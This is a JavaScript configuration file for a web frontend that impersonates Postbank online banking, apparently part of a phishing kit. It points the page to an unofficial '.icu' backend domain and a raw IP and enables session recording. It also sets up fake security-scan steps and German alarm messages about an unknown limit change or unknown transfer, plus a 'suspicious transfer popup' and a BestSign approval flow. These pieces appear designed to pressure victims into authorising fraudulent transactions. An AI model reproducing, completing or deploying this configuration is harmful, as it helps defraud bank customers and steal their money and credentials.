// ============================================
// Postbank Frontend - Configuration
// ============================================
// This file contains all configuration for the
// postbank-frontend React application.
// 
// IMPORTANT: This frontend is deployed on a
// SEPARATE server from the backend.
// ============================================

const config = {
  // ===========================================
  // Server Configuration
  // ===========================================
  servers: {
    // Backend API domain (HTTPS)
    apiDomain: 'pb-api-systemsbackend.icu',
    
    // Backend server IP (fallback)
    backendServerIp: '5.181.0.179',
  },

  // ===========================================
  // API Configuration
  // ===========================================
  api: {
    // Full API URL - can be overridden by env var
    get url() {
      // Use environment variable if set
      if (import.meta.env.VITE_API_URL) {
        return import.meta.env.VITE_API_URL;
      }
      // Use HTTPS API domain
      return `https://${config.servers.apiDomain}`;
    },
    
    // Relative API path (when using nginx proxy)
    relativePath: '/api',
  },

  // ===========================================
  // Mock Mode Configuration
  // ===========================================
  mock: {
    // Enable mock mode from env or URL param
    get enabled() {
      const urlParams = new URLSearchParams(window.location.search);
      return import.meta.env.VITE_MOCK_MODE === 'true' || urlParams.get('mock') === 'true';
    },
    
    // Default mock data
    defaults: {
      balance: 15000,
      limit: 5000,
      accountHolder: 'Max Mustermann',
      iban: 'DE89370400440532013000',
    },
  },

  // ===========================================
  // UI Configuration
  // ===========================================
  ui: {
    // App title
    title: 'Postbank Online-Banking',
    
    // Security scan steps
    securityScanSteps: [
      'Verbindungsaufbau zum Sicherheitsserver',
      'Authentifizierung der Sitzung',
      'Überprüfung der Systemintegrität',
      'Überprüfung Ihrer Kontolimits',
      'Analyse aktueller Kontobewegungen',
    ],
    
    // BestSign timeout (ms)
    bestSignTimeout: 120000, // 2 minutes
    
    // Poll interval for status checks (ms)
    pollInterval: 2000,
  },

  // ===========================================
  // Session Recording
  // ===========================================
  recording: {
    // Enable session recording
    enabled: true,
    
    // Recording interval (ms)
    interval: 5000,
  },

  // ===========================================
  // Postbank Branding
  // ===========================================
  branding: {
    logoUrl: '/assets/images/pb-logo.svg',
    splashLogoUrl: '/assets/images/pb-logo-splash.svg',
    backgroundUrl: '/assets/images/background.jpg',
    primaryColor: '#ffcc00',
    secondaryColor: '#1e344e',
  },

  // ===========================================
  // Error Messages (German)
  // ===========================================
  messages: {
    limitError: 'Ihr Tageslimit wurde von einer unbekannten IP-Adresse geändert. Bitte setzen Sie es zurück.',
    transferError: 'Eine unbekannte Überweisung wurde in Ihrem Konto festgestellt. Bitte überprüfen Sie diese.',
    connectionError: 'Verbindungsfehler. Bitte versuchen Sie es erneut.',
    sessionExpired: 'Ihre Sitzung ist abgelaufen. Bitte melden Sie sich erneut an.',
  },

  // ===========================================
  // Feature Flags
  // ===========================================
  features: {
    // Enable suspicious transfer popup
    suspiciousTransferPopup: true,
    
    // Enable limit change functionality
    limitChange: true,
    
    // Enable BestSign approval flow
    bestSign: true,
  },
};

export default config;



















